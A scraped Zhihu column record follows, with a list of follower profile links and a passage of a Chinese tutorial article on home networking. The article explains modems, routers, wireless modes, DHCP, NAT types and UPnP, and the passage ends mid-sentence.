{
    "title": "WoodenRobot技术杂谈", 
    "description": "", 
    "followers": [
        "https://www.zhihu.com/people/zheng-jian-yang-56", 
        "https://www.zhihu.com/people/james-chang-67", 
        "https://www.zhihu.com/people/ding-jian-80-69", 
        "https://www.zhihu.com/people/hengjin-xu", 
        "https://www.zhihu.com/people/wang-ming-66-71", 
        "https://www.zhihu.com/people/li-li-97-75-62", 
        "https://www.zhihu.com/people/ying-shi-24-79", 
        "https://www.zhihu.com/people/puroeitike", 
        "https://www.zhihu.com/people/wang-shang-lin", 
        "https://www.zhihu.com/people/xiang-yao-tiao-de-geng-yuan-de-li-zi", 
        "https://www.zhihu.com/people/hf-zhang-27", 
        "https://www.zhihu.com/people/prince-37", 
        "https://www.zhihu.com/people/zhukaixy", 
        "https://www.zhihu.com/people/flaster", 
        "https://www.zhihu.com/people/li-dan-ding-37-41", 
        "https://www.zhihu.com/people/weilaiyilai", 
        "https://www.zhihu.com/people/hu-shao-hui-54", 
        "https://www.zhihu.com/people/yang-jing-lin-16", 
        "https://www.zhihu.com/people/zacklocx-12", 
        "https://www.zhihu.com/people/xiao-jie-32", 
        "https://www.zhihu.com/people/hui-lang-16", 
        "https://www.zhihu.com/people/feng-liang-9-88", 
        "https://www.zhihu.com/people/huang-huang-bu-bu-bu-zhi-he-chu-qu", 
        "https://www.zhihu.com/people/cuda", 
        "https://www.zhihu.com/people/likelxl", 
        "https://www.zhihu.com/people/123456-36-71", 
        "https://www.zhihu.com/people/tian-si-16-91", 
        "https://www.zhihu.com/people/ye-xiao-1-61", 
        "https://www.zhihu.com/people/xiao-lang-dao-you", 
        "https://www.zhihu.com/people/dragon-lee-75", 
        "https://www.zhihu.com/people/da-ge-16-61", 
        "https://www.zhihu.com/people/ta-you-38", 
        "https://www.zhihu.com/people/hi-painter", 
        "https://www.zhihu.com/people/liu-liu-72-41-78", 
        "https://www.zhihu.com/people/wzh-43-65", 
        "https://www.zhihu.com/people/zhang-zi-cheng-81", 
        "https://www.zhihu.com/people/liu-qi-tao-57", 
        "https://www.zhihu.com/people/kang-shao-1990", 
        "https://www.zhihu.com/people/nick-81-84", 
        "https://www.zhihu.com/people/wang-ya-han-67-1", 
        "https://www.zhihu.com/people/chen-ci-34", 
        "https://www.zhihu.com/people/xirtual", 
        "https://www.zhihu.com/people/li-zi-xin-58-7", 
        "https://www.zhihu.com/people/zheng-le-jun", 
        "https://www.zhihu.com/people/johnny-63-54", 
        "https://www.zhihu.com/people/zhi-zhe-zai-cao-mang", 
        "https://www.zhihu.com/people/nai-ruo-an-hao-49", 
        "https://www.zhihu.com/people/feng-xin-yu-15-86", 
        "https://www.zhihu.com/people/gameending", 
        "https://www.zhihu.com/people/he-cheng-ke-20", 
        "https://www.zhihu.com/people/bu-zhi-da-21", 
        "https://www.zhihu.com/people/da-sha-yu-he-xiao-xia-mi", 
        "https://www.zhihu.com/people/cancanxinxin", 
        "https://www.zhihu.com/people/li-jin-zhou-91", 
        "https://www.zhihu.com/people/sphinx-wu", 
        "https://www.zhihu.com/people/liu-peng-fei-6", 
        "https://www.zhihu.com/people/Qasak", 
        "https://www.zhihu.com/people/zone10", 
        "https://www.zhihu.com/people/hcat", 
        "https://www.zhihu.com/people/progray", 
        "https://www.zhihu.com/people/dao-cao-59", 
        "https://www.zhihu.com/people/yuncanghero", 
        "https://www.zhihu.com/people/benlouis", 
        "https://www.zhihu.com/people/programmer_song", 
        "https://www.zhihu.com/people/feng-jia-qi-75-83", 
        "https://www.zhihu.com/people/showzonezhu", 
        "https://www.zhihu.com/people/bei-ming-96-58", 
        "https://www.zhihu.com/people/bright-10-99", 
        "https://www.zhihu.com/people/lian-zhi-wen", 
        "https://www.zhihu.com/people/huang-en-da-11", 
        "https://www.zhihu.com/people/roy-lee-81", 
        "https://www.zhihu.com/people/ipdf", 
        "https://www.zhihu.com/people/wang-yun-long-93-33", 
        "https://www.zhihu.com/people/chen-jun-yu-35-63", 
        "https://www.zhihu.com/people/thinkingMy", 
        "https://www.zhihu.com/people/vrboxing", 
        "https://www.zhihu.com/people/stone-72", 
        "https://www.zhihu.com/people/yuan-dan-18", 
        "https://www.zhihu.com/people/jin-yuan-64", 
        "https://www.zhihu.com/people/bei-tang-yi", 
        "https://www.zhihu.com/people/chou-57", 
        "https://www.zhihu.com/people/ma-kai-yue-88", 
        "https://www.zhihu.com/people/xiao-yao-sheng", 
        "https://www.zhihu.com/people/rachel-14-66-97", 
        "https://www.zhihu.com/people/duan-xiao-hui-86", 
        "https://www.zhihu.com/people/zhang-zhi-shi-43-28", 
        "https://www.zhihu.com/people/peng-jin-yi", 
        "https://www.zhihu.com/people/inoki", 
        "https://www.zhihu.com/people/li-jack-99", 
        "https://www.zhihu.com/people/zhao-xiao-qiang-84", 
        "https://www.zhihu.com/people/shang-hai-xiao-ye-mao-72", 
        "https://www.zhihu.com/people/legolas-82-7", 
        "https://www.zhihu.com/people/chi-guo-guo-75", 
        "https://www.zhihu.com/people/jasonhaven", 
        "https://www.zhihu.com/people/jc1916", 
        "https://www.zhihu.com/people/kitlui", 
        "https://www.zhihu.com/people/kan-kan-kan-kan-28", 
        "https://www.zhihu.com/people/rui-chang-56", 
        "https://www.zhihu.com/people/wang-le-tian-79-1", 
        "https://www.zhihu.com/people/ru-ye-ren-tai", 
        "https://www.zhihu.com/people/a-a-nian-zjs", 
        "https://www.zhihu.com/people/wen-li-jun-97", 
        "https://www.zhihu.com/people/wang-fan-86-51", 
        "https://www.zhihu.com/people/chai-chun-ling-68", 
        "https://www.zhihu.com/people/mu-xing-40-93", 
        "https://www.zhihu.com/people/wujunzero", 
        "https://www.zhihu.com/people/firetaker", 
        "https://www.zhihu.com/people/ColorFuzzy", 
        "https://www.zhihu.com/people/liqiang123", 
        "https://www.zhihu.com/people/li-cheng-37-32", 
        "https://www.zhihu.com/people/bing-han-19", 
        "https://www.zhihu.com/people/sun-qi-34-45-72", 
        "https://www.zhihu.com/people/wang-chong-31-51", 
        "https://www.zhihu.com/people/wu-xu-35-30", 
        "https://www.zhihu.com/people/da-nao-dai-you-da-zhi-hui", 
        "https://www.zhihu.com/people/zhi-meng-chu-xin", 
        "https://www.zhihu.com/people/nan-nan-bu-hua", 
        "https://www.zhihu.com/people/szabcd", 
        "https://www.zhihu.com/people/dong-ray-53", 
        "https://www.zhihu.com/people/lisa-36-14", 
        "https://www.zhihu.com/people/ban-dao-mi-yin-66", 
        "https://www.zhihu.com/people/jiahai-wu", 
        "https://www.zhihu.com/people/chen-ji-chang-80-55", 
        "https://www.zhihu.com/people/li-wen-han008", 
        "https://www.zhihu.com/people/li-wen-qi-14-93", 
        "https://www.zhihu.com/people/fei-du-du-de-shang-di", 
        "https://www.zhihu.com/people/unseen-18", 
        "https://www.zhihu.com/people/hu-xiao-heng", 
        "https://www.zhihu.com/people/liu-bo-liu-yan-jiao", 
        "https://www.zhihu.com/people/brogua", 
        "https://www.zhihu.com/people/guang-tai-lang-98", 
        "https://www.zhihu.com/people/jiang-min-miao", 
        "https://www.zhihu.com/people/lesmillsxx", 
        "https://www.zhihu.com/people/gao-shi-yu-59", 
        "https://www.zhihu.com/people/heather-73-34", 
        "https://www.zhihu.com/people/hua-wei-79", 
        "https://www.zhihu.com/people/han-peng-fei-36-47", 
        "https://www.zhihu.com/people/iot-47-28", 
        "https://www.zhihu.com/people/she-liang", 
        "https://www.zhihu.com/people/One-chavez", 
        "https://www.zhihu.com/people/lu-bin-29-93", 
        "https://www.zhihu.com/people/CedricChan", 
        "https://www.zhihu.com/people/luo-bin-91-47", 
        "https://www.zhihu.com/people/lao-xian-sheng-38-19", 
        "https://www.zhihu.com/people/SecondaryMarquis", 
        "https://www.zhihu.com/people/ghost-70", 
        "https://www.zhihu.com/people/tou-wong-64", 
        "https://www.zhihu.com/people/xu-yin-da-58", 
        "https://www.zhihu.com/people/romepeng-1", 
        "https://www.zhihu.com/people/xu-yi-hang", 
        "https://www.zhihu.com/people/di-liang", 
        "https://www.zhihu.com/people/spacefan", 
        "https://www.zhihu.com/people/wang-san-dao", 
        "https://www.zhihu.com/people/shumeipai", 
        "https://www.zhihu.com/people/zerone-48-47", 
        "https://www.zhihu.com/people/yang-gang-69-84", 
        "https://www.zhihu.com/people/willwinworld", 
        "https://www.zhihu.com/people/rang-tong-geng-tong", 
        "https://www.zhihu.com/people/puming-30", 
        "https://www.zhihu.com/people/zhang-hai-45", 
        "https://www.zhihu.com/people/a-bei-er-35", 
        "https://www.zhihu.com/people/zheng-cheng-43-41", 
        "https://www.zhihu.com/people/tang-yi-liu-an", 
        "https://www.zhihu.com/people/ygxc", 
        "https://www.zhihu.com/people/luxun-huang", 
        "https://www.zhihu.com/people/wwkinu", 
        "https://www.zhihu.com/people/huang-zhi-ming-37", 
        "https://www.zhihu.com/people/yyqk", 
        "https://www.zhihu.com/people/wangwensong-9128", 
        "https://www.zhihu.com/people/wj2014-59", 
        "https://www.zhihu.com/people/ticktock-47", 
        "https://www.zhihu.com/people/masachencer", 
        "https://www.zhihu.com/people/li-da-pang-59", 
        "https://www.zhihu.com/people/yu-li-39-82", 
        "https://www.zhihu.com/people/chen-song-38-23", 
        "https://www.zhihu.com/people/he-jin-feng-9-21"
    ], 
    "article": [
        {
            "url": "https://zhuanlan.zhihu.com/p/84469425", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 5, 
            "title": "家庭网络漫游指南", 
            "content": "<blockquote>本文首发于：<a href=\"https://link.zhihu.com/?target=http%3A//localhost%3A4000/2019/09/27/home-internet/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">家庭网络漫游指南</a></blockquote><h2><b>光猫</b></h2><blockquote>光网络终端（英语：Optical Network Terminals，俗称光猫或光 modem），是指通过光纤介质进行传输，将光信号调制解调为其他协议信号的网络设备。光猫设备作为大型局域网、城域网和广域网的中继传输设备。</blockquote><p>光猫的主要功能为信号转换，它的后端接口除了连接电脑，还可以连接电视或电话。</p><h2><b>路由器</b></h2><blockquote>路由器（英语：Router，又称路径器）是一种电讯网络设备，提供路由与转送两种重要机制，可以决定数据包从来源端到目的端所经过的路由路径（host 到 host 之间的传输路径），这个过程称为路由；将路由器输入端的数据包移送至适当的路由器输出端（在路由器内部进行），这称为转送。路由工作在 OSI 模型的第三层——即网络层，例如网际协议（IP）。</blockquote><h3><b>基本概念</b></h3><p>路由器就是连接两个以上个别网络的设备。</p><p>由于位于两个或更多个网络的交汇处，从而可在它们之间传递分组（一种数据的组织形式）。路由器与交换机在概念上有一定重叠但也有不同：交换机泛指工作于任何网络层次的数据中继设备（尽管多指网桥），而路由器则更专注于网络层。</p><p>路由器与交换机的差别，路由器是属于 OSI 第三层的产品，交換机是 OSI 第二层的产品。第二层的产品功能在于，将网络上各个计算机的 MAC 地址记在 MAC 地址表中，当局域网中的计算机要经过交換机去交换传递数据时，就查询交換机上的 MAC 地址表中的信息，将数据包发送给指定的计算机，而不会像第一层的产品（如集线器）每台在网络中的计算机都发送。而路由器除了有交換机的功能外，更拥有路由表作为发送数据包时的依据，在有多种选择的路径中选择最佳的路径。此外，并可以连接两个以上不同网段的网络，而交換机只能连接两个。并具有 IP 分享的功能，如：区分哪些数据包是要发送至 WAN。路由表存储了（向前往）某一网络的最佳路径，该路径的“路由度量值”以及下一个（跳路由器）。参考条目路由获得这个过程的详细描述。</p><h3><b>WAN 口和 LAN口</b></h3><p>路由器通常包含一个 WAN 口多个 LAN 口(PS: 有些特殊的路由器包含多个 WAN 口)。</p><blockquote>广域网（英语：Wide Area Network，缩写为 WAN），又称广域网、外网、公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。<br/>局域网（Local Area Network，简称 LAN）是连接住宅、学校、实验室、大学校园或办公大楼等有限区域内计算机的计算机网络。相比之下，广域网（WAN）不仅覆盖较大的地理距离，而且还通常涉及固接专线和对于互联网的链接。 相比来说互联网则更为广阔，是连接全球商业和个人计算机的系统。</blockquote><p>通常情况下，宽带安装好以后使用网线连接光猫和路由器 WAN 口，其他设备连接路由器 LAN 口或者无线网络即可浏览互联网。</p><h3><b>路由器的六种无线模式</b></h3><h3><b>无线访问节点 (AP「Access Point」)</b></h3><p>该模式下路由器的无线网卡就像一个”无线 HUB”，负责建立无线路由器和电脑之间的数据链路（相当于无形的网线）。正常情况下，家用的无线路由器的无线连接都默认工作在此模式下。</p><h3><b>客户端 (Client)</b></h3><p>像笔记本电脑上的无线网卡那样工作，仅连接其它的无线网络，而不发射自己的无线网络信号。对于无线路由器来说，这种模式相当于启用了一个无线的 WAN 口，且下面的电脑只能通过有线方式接到此设备。内部的LAN口组成的局域网和连接上的无线网段处于相同的 IP 地址段。内部的 DHCP 请求也会被转发到主无线网络上。</p><h3><b>客户端网桥 (Client Bridge)</b></h3><p>和“客户端”模式一样，相当于启用了一个无线的 WAN 口，且下面的电脑只能通过有线方式接到此设备。不过，该模式下无线路由器仍然提供 DHCP 及 NAT 功能，内部 LAN 口组成的单独 IP 地址段局域网，通过无线路由器上自己的网关，连上外部主网络。</p><h3><b>Adhoc</b></h3><p>Adhoc 有个形象的比喻，就像是将两台电脑之间直接找根网线连起来，只不过在这里这根网线是个无线的。最常见的使用adhoc连接的设备多数是一些手持游戏机。该模式在无线路由器上使用的场合比较罕见。</p><h3><b>中继 (Repeater)</b></h3><p>顾名思义，中继就是一边是接受信号，一边又发射自己的无线信号。在这种模式下无线路由器以无线网卡客户身份接入主 AP，然后再以新增虚拟界面(Virtual Interfaces)来为客户端提供无线接入。该模式的最大意义在于可以解决无线信号受到距离或者障碍物的影响不能传输到更远的问题。<br/>接入到该无线路由器上的电脑终端，是和主无线网网络处在相同的 IP 地址段。内部的 DHCP 请求，也会被转发到主无线网络上。</p><h3><b>中继桥接 (Repeater Bridge)</b></h3><p>和”中继”模式一样，可以解决无线信号受到距离或者障碍物的影响不能传输到更远的问题。不过，这种模式下无线路由器仍然提供 DHCP 及 NAT 功能，即所有的内部 LAN 口以及无线客户接入组成的是一个单独的局域网网段。</p><h2><b>DHCP</b></h2><blockquote>动态主机设置协议（英语：Dynamic Host Configuration Protocol，缩写：DHCP）是一个用于局域网的网络协议，位于 OSI 模型的应用层，使用 UDP 协议工作，主要有两个用途：<br/></blockquote><ul><li>用于内部网或网络服务供应商自动分配IP地址给用户</li><li>用于内部网管理员作为对所有计算机作中央管理的手段</li></ul><p class=\"ztext-empty-paragraph\"><br/></p><h3><b>解析 DHCP 的工作方式</b></h3><p>当一台机器新加入一个网络的时候，肯定一脸懵，啥情况都不知道，只知道自己的 MAC 地址。怎么办？先吼一句，我来啦，有人吗？这时候的沟通基本靠“吼”。这一步，我们称为 DHCP Discover。</p><p>新来的机器使用 IP 地址 0.0.0.0 发送了一个广播包，目的 IP 地址为 255.255.255.255。广播包封装了 UDP，UDP 封装了 BOOTP。其实 DHCP 是 BOOTP 的增强版，但是如果你去抓包的话，很可能看到的名称还是 BOOTP 协议。</p><p>在这个广播包里面，新人大声喊：我是新来的（Boot request），我的 MAC 地址是这个，我还没有 IP，谁能给租给我个 IP 地址！</p><p>格式就像这样：<br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-601add929ee1983632a20c8c913549ed_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"492\" data-rawheight=\"304\" class=\"origin_image zh-lightbox-thumb\" width=\"492\" data-original=\"https://pic2.zhimg.com/v2-601add929ee1983632a20c8c913549ed_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;492&#39; height=&#39;304&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"492\" data-rawheight=\"304\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"492\" data-original=\"https://pic2.zhimg.com/v2-601add929ee1983632a20c8c913549ed_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-601add929ee1983632a20c8c913549ed_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>如果一个网络管理员在网络里面配置了 DHCP Server 的话，他就相当于这些 IP 的管理员。他立刻能知道来了一个“新人”。这个时候，我们可以体会 MAC 地址唯一的重要性了。当一台机器带着自己的 MAC 地址加入一个网络的时候，MAC 是它唯一的身份，如果连这个都重复了，就没办法配置了。</p><p>只有 MAC 唯一，IP 管理员才能知道这是一个新人，需要租给它一个 IP 地址，这个过程我们称为 DHCP Offer。同时，DHCP Server 为此客户保留为它提供的 IP 地址，从而不会为其他 DHCP 客户分配此 IP 地址。</p><p>DHCP Offer 的格式就像这样，里面有给新人分配的地址。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-0d35a89a150d3377df74483cf9106b8e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"439\" data-rawheight=\"304\" class=\"origin_image zh-lightbox-thumb\" width=\"439\" data-original=\"https://pic3.zhimg.com/v2-0d35a89a150d3377df74483cf9106b8e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;439&#39; height=&#39;304&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"439\" data-rawheight=\"304\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"439\" data-original=\"https://pic3.zhimg.com/v2-0d35a89a150d3377df74483cf9106b8e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-0d35a89a150d3377df74483cf9106b8e_b.jpg\"/></figure><p><br/>DHCP Server 仍然使用广播地址作为目的地址，因为，此时请求分配 IP 的新人还没有自己的 IP。DHCP Server 回复说，我分配了一个可用的 IP 给你，你看如何？除此之外，服务器还发送了子网掩码、网关和 IP 地址租用期等信息。</p><p>新来的机器很开心，它的“吼”得到了回复，并且有人愿意租给它一个 IP 地址了，这意味着它可以在网络上立足了。当然更令人开心的是，如果有多个 DHCP Server，这台新机器会收到多个 IP 地址，简直受宠若惊。</p><p>它会选择其中一个 DHCP Offer，一般是最先到达的那个，并且会向网络发送一个 DHCP Request 广播数据包，包中包含客户端的 MAC 地址、接受的租约中的 IP 地址、提供此租约的 DHCP 服务器地址等，并告诉所有 DHCP Server 它将接受哪一台服务器提供的 IP 地址，告诉其他 DHCP 服务器，谢谢你们的接纳，并请求撤销它们提供的 IP 地址，以便提供给下一个 IP 租用请求者。<br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-1e3dd1cd39f9b42ffa0768cec561172e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"488\" data-rawheight=\"303\" class=\"origin_image zh-lightbox-thumb\" width=\"488\" data-original=\"https://pic3.zhimg.com/v2-1e3dd1cd39f9b42ffa0768cec561172e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;488&#39; height=&#39;303&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"488\" data-rawheight=\"303\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"488\" data-original=\"https://pic3.zhimg.com/v2-1e3dd1cd39f9b42ffa0768cec561172e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-1e3dd1cd39f9b42ffa0768cec561172e_b.jpg\"/></figure><p><br/>此时，由于还没有得到 DHCP Server 的最后确认，客户端仍然使用 0.0.0.0 为源 IP 地址、255.255.255.255 为目标地址进行广播。在 BOOTP 里面，接受某个 DHCP Server 的分配的 IP。</p><p>当 DHCP Server 接收到客户机的 DHCP request 之后，会广播返回给客户机一个 DHCP ACK 消息包，表明已经接受客户机的选择，并将这一 IP 地址的合法租用信息和其他的配置信息都放入该广播包，发给客户机，欢迎它加入网络大家庭。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-d32ffc8d9cc25b9727e8095efb23e5cf_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"455\" data-rawheight=\"311\" class=\"origin_image zh-lightbox-thumb\" width=\"455\" data-original=\"https://pic4.zhimg.com/v2-d32ffc8d9cc25b9727e8095efb23e5cf_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;455&#39; height=&#39;311&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"455\" data-rawheight=\"311\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"455\" data-original=\"https://pic4.zhimg.com/v2-d32ffc8d9cc25b9727e8095efb23e5cf_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-d32ffc8d9cc25b9727e8095efb23e5cf_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>最终租约达成的时候，还是需要广播一下，让大家都知道。</p><h3><b>IP 地址的收回和续租</b></h3><p>既然是租房子，就是有租期的。租期到了，管理员就要将 IP 收回。</p><p>如果不用的话，收回就收回了。就像你租房子一样，如果还要续租的话，不能到了时间再续租，而是要提前一段时间给房东说。DHCP 也是这样。</p><p>客户机会在租期过去 50% 的时候，直接向为其提供 IP 地址的 DHCP Server 发送 DHCP request 消息包。客户机接收到该服务器回应的 DHCP ACK 消息包，会根据包中所提供的新的租期以及其他已经更新的 TCP/IP 参数，更新自己的配置。这样，IP 租用更新就完成了。</p><p>好了，一切看起来完美。DHCP 协议大部分人都知道，但是其实里面隐藏着一个细节，很多人可能不会去注意。接下来，我就讲一个有意思的事情：网络管理员不仅能自动分配 IP 地址，还能帮你自动安装操作系统！</p><h2><b>NAT</b></h2><blockquote>网络地址转换（英语：Network Address Translation，缩写：NAT；又称网络掩蔽、IP 掩蔽）在计算机网络中是一种在IP数据包通过路由器或防火墙时重写来源 IP 地址或目的 IP 地址的技术。这种技术被普遍使用在有多台主机但只通过一个公有 IP 地址访问因特网的私有网络中。它是一个方便且得到了广泛应用的技术。当然，NAT 也让主机之间的通信变得复杂，导致了通信效率的降低。</blockquote><h3><b>NAT 转换规则</b></h3><ul><li>对于 TCP/UDP 使用<br/>Host &#39;s 私有 IPv4 + Port &lt;------&gt; NAT 公网 IPv4 + Port</li><li>对于ICMP使用<br/>Host &#39;s 私有 IPv4 + session ID &lt;------&gt; NAT 公网 IPv4 + session ID</li></ul><p>规则其实非常好理解，由于 session ID 在 NAT 设备上是独一无二的，所以NAT可以很容易区别局域网内部的不同 host。</p><p>至于其它传输协议，NAT 使用的也是类似 session ID 的转换规则，即使用可以将不同 host 轻易分辨出来的字段做键值（KEY），动态创建映射表项，做双向的地址+ KEY 的转换。</p><h3><b>不同类型的 NAT</b></h3><h3><b>完全圆锥型 NAT（Full cone NAT），即一对一（one-to-one）NAT</b></h3><ul><li>一旦一个内部地址（iAddr:port）映射到外部地址（eAddr:port），所有发自 iAddr:port 的包都经由 eAddr:port 向外发送。任意外部主机都能通过给 eAddr:port 发包到达 iAddr:port（注：port不需要一样）</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-dd074246a8c401e85cd33a3b549da1db_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"360\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic4.zhimg.com/v2-dd074246a8c401e85cd33a3b549da1db_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;800&#39; height=&#39;360&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"360\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"800\" data-original=\"https://pic4.zhimg.com/v2-dd074246a8c401e85cd33a3b549da1db_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-dd074246a8c401e85cd33a3b549da1db_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3><b>受限圆锥型 NAT（Address-Restricted cone NAT）</b></h3><ul><li>内部客户端必须首先发送数据包到对方（IP=X.X.X.X），然后才能接收来自 X.X.X.X 的数据包。在限制方面，唯一的要求是数据包是来自 X.X.X.X。</li><li>内部地址（iAddr:port1）映射到外部地址（eAddr:port2），所有发自 iAddr:port1 的包都经由 eAddr:port2 向外发送。外部主机（hostAddr:any）能通过给 eAddr:port2 发包到达 iAddr:port1。（注：any指外部主机源端口不受限制，但是目的端口必须是 port2。只有外部主机数据包的目的 IP 为 内部客户端的所映射的外部 ip，且目的端口为 port2 时数据包才被放行。）<br/></li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-0cf6f25e575e1ee56475d4edba0a2375_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"756\" data-rawheight=\"340\" class=\"origin_image zh-lightbox-thumb\" width=\"756\" data-original=\"https://pic2.zhimg.com/v2-0cf6f25e575e1ee56475d4edba0a2375_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;756&#39; height=&#39;340&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"756\" data-rawheight=\"340\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"756\" data-original=\"https://pic2.zhimg.com/v2-0cf6f25e575e1ee56475d4edba0a2375_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-0cf6f25e575e1ee56475d4edba0a2375_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3><b>端口受限圆锥型NAT（Port-Restricted cone NAT）</b></h3><p>类似受限制锥形NAT（Restricted cone NAT），但是还有端口限制。</p><ul><li>一旦一个内部地址（iAddr:port1）映射到外部地址（eAddr:port2），所有发自 iAddr:port1 的包都经由 eAddr:port2 向外发送。</li><li>在受限圆锥型NAT基础上增加了外部主机源端口必须是固定的。<br/></li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-e56819e66cd8fa56bfd86a2670ab718e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"360\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic3.zhimg.com/v2-e56819e66cd8fa56bfd86a2670ab718e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;800&#39; height=&#39;360&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"360\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"800\" data-original=\"https://pic3.zhimg.com/v2-e56819e66cd8fa56bfd86a2670ab718e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-e56819e66cd8fa56bfd86a2670ab718e_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3><b>对称 NAT（Symmetric NAT）</b></h3><ul><li>每一个来自相同内部 IP 与端口，到一个特定目的地地址和端口的请求，都映射到一个独特的外部 IP 地址和端口。</li><li>同一内部 IP 与端口发到不同的目的地和端口的信息包，都使用不同的映射<br/>只有曾经收到过内部主机数据的外部主机，才能够把数据包发回</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-726b205c0e7e77504e0e1b80df94e6bb_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"360\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic4.zhimg.com/v2-726b205c0e7e77504e0e1b80df94e6bb_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;800&#39; height=&#39;360&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"360\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"800\" data-original=\"https://pic4.zhimg.com/v2-726b205c0e7e77504e0e1b80df94e6bb_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-726b205c0e7e77504e0e1b80df94e6bb_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2><b>UPnP</b></h2><blockquote>通用即插即用（英语：Universal Plug and Play，简称UPnP）是由“通用即插即用论坛”（UPnP™ Forum）推广的一套网络协议。该协议的目标是使家庭网络（数据共享、通信和娱乐）和公司网络中的各种设备能够相互无缝连接，并简化相关网络的实现。UPnP 通过定义和发布基于开放、因特网通讯网协议标准的 UPnP 设备控制协议来实现这一目标。</blockquote><p>可以理解为有了 UPnP 软件可以根据需求让路由器进行动态地进行端口映射。而不是你去路由器后台一个个手动设置。</p><h2><b>提升 NAT 类型</b></h2><p>一般来说，我们希望 NAT 层数越少越好。每多一层 NAT 就意味着更加复杂的情况与配置。依旧是典型的网络拓扑：</p><blockquote>入户光纤① → 猫② → 路由器③ → 终端设备</blockquote><p>我们目标是把 NAT 降到1层（只有③），当然这是目标，但不是必须的。</p><h3><b>拿到公网 IP</b></h3><p>拥有公网 IP 对于 P2P 应用来说绝对是一个基础要求，这可以省掉许多麻烦（使①不发生 NAT）。如何确定自己是不是公网 IP 也很简单。访问这里你可以得到一个 IP 地址，把它与路由器中显示的 WAN 口 IP 进行比较，如果一致那么就是公网 IP 